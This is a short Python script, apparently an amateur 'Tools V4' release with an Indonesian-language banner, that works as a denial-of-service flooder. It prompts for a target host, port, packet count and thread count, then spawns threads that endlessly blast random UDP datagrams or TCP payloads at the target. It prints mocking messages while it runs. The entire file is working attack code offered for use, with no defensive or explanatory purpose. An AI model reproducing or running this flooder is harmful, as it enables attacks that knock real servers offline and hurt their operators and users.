#!/usr/bin/env python3
#Code By XDempteRX
import random
import socket
import threading

os.system("clear")
print("══》 Tools V4 By : XDempteRX 《══")
print("██╗░░██╗###############██")
print("╚██╗██╔╝|Autor : XDempteRX   |")
print("░╚███╔╝░|Yang Mau Rename|")
print("░██╔██╗░|Pm me !!!!     |")
print("██╔╝╚██╗|Xstyleboy Team |")
print("╚═╝░░╚═╝###############██")

ip = str(input("══》HOST/IP TARGET:"))
port = int(input("══》PORT TARGET:"))
choice = str(input("══》GASS BRO SERANG?(y/n):"))
times = int(input("══》PACKETS DDOS:"))
threads = int(input("══》THREADS DDOS:"))
def run():
	data = random._urandom(9904)
	i = random.choice(("[&]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Packets Sent To Server!!!")
		except:
			print("[!] Mampus Udh Knock!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[&]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Packets Sent To Server!!!")
		except:
			s.close()
			print("[*] Mampus Udh Knock")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
